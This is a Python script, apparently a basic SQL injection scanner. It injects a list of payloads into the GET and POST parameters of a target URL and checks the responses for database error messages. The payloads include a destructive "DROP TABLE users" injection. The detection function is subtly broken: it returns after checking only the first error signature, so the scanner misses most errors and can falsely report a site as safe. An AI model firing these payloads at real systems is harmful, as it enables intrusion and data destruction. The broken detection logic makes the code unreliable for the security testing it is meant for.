import requests
from urllib.parse import urlparse, urlencode, parse_qs

sql_payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "'; DROP TABLE users; --",
    '" OR "1"="1"',
    "' OR 'a'='a",
    "' OR 1=1#",
]

error_signatures = [
    "You have an error in your SQL syntax",
    "Warning: mysql_",
    "Unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "ODBC SQL Server Driver",
    "ORA-01756",  
    "pg_query(): Query failed",      
]

def detect_error(response_text):
    for error in error_signatures:
        if error.lower() in response_text.lower():
            return True
        return False

def test_sqli(url,method,header=None,data=None):
    print("[*] Testing for sql injection")
    vulnerable = False

    if method=="GET":
        parsed = urlparse(url)
        query = parse_qs(parsed.query)

        for param in query:
            for payload in sql_payloads:

                modified_query = query.copy()
                modified_query[param] = payload
                new_query = urlencode(modified_query,doseq=True)
                new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

                print(f"[*]Testing the payload on {param} : {payload}")

                try:
                    resp = requests.get(new_url,headers=header)
                    if detect_error(resp.text):
                        print(f"possible sql injection in parameter : {param}")
                        vulnerable= True

                except Exception as e:
                    print(f"[!] error testing payload: {e}")
    elif method == "POST":
        if not data:
            print("No POST  data provided for testing sql injection")
            return
        for param in data:
            for payload in sql_payloads:
                modified_data = data.copy()
                modified_data[param] = payload

                print(f"testing the payload on {param}: {payload}")

                try:
                    resp = requests.post(url,headers=header,data=modified_data)
                    if detect_error(resp.text):
                        print(f"possible sql injection on parameter {param}")
                        vulnerable= True
                except Exception as e:
                    print(f"[!] error testing the payload : {e}")
    else:
        print("sql testing only supported in get and post currently")

    if not vulnerable:
        print("[*] no sql injection found using basic payloads")
    